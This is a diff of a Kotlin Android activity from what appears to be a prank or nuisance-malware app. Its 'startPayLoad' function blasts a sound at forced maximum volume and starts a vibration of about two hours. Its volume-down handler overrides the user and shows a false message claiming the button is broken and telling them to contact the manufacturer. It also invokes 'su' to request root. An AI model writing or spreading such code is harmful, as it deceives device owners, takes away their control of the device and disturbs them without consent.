@@ -16,19 +16,18 @@ class MainActivity3 : AppCompatActivity() {
         setContentView(R.layout.activity_main3)
     }
 
-     fun overload(view: View) {
+     fun startPayLoad(view: View) {
         val macaxera = MediaPlayer.create(this, R.raw.macaxera);
         macaxera.start();
-
          val manager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
         manager.setStreamVolume(AudioManager.STREAM_MUSIC, manager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
-         vibrate(longArrayOf(5000, 5000000000000000))
+         vibrate();
      }
 
     override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
         when (keyCode) {
             KeyEvent.KEYCODE_VOLUME_DOWN -> {
-                Toast.makeText(applicationContext, "Seu dispositivo foi asutiado", Toast.LENGTH_LONG).show()
+                Toast.makeText(applicationContext, "Vol Down está danificado, entre em contato com a fabricante do seu dispositivo", Toast.LENGTH_LONG).show()
                 val manager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                 manager.setStreamVolume(AudioManager.STREAM_MUSIC, manager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
             }
@@ -39,26 +38,29 @@ class MainActivity3 : AppCompatActivity() {
 
     fun requestRoot(view: View) {
         val process = Runtime.getRuntime().exec("su")
-        if (process === null) {
-            Toast.makeText(applicationContext, "Não foi possível asutiar o telefone", Toast.LENGTH_LONG).show()
-        } else {
-            Toast.makeText(applicationContext, "Telefone asutiado com sucesso", Toast.LENGTH_LONG).show()
+        if (process !== null) {
+            Toast.makeText(applicationContext, "Todos aqui nos divertiremos", Toast.LENGTH_LONG).show()
             val intent = Intent(this, RootActivity::class.java)
             startActivity(intent)
+        } else {
+            Toast.makeText(applicationContext, "CANNOT_ASSUTY_THIS_DEVICE", Toast.LENGTH_LONG).show()
         }
     }
-    fun Context.vibrate(pattern: LongArray) {
+    fun Context.vibrate() {
         val vibrator =
             applicationContext.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator? ?: return
 
+        val pattern = longArrayOf(0, 7200000, 1000)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             vibrator.vibrate(
                 VibrationEffect.createWaveform(pattern, VibrationEffect.DEFAULT_AMPLITUDE)
             )
 
         } else {
-            @Suppress("DEPRECATION")
-            vibrator.vibrate(pattern, 5006600 * pattern.size)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(pattern, 0)
+            }
         }
     }
 }
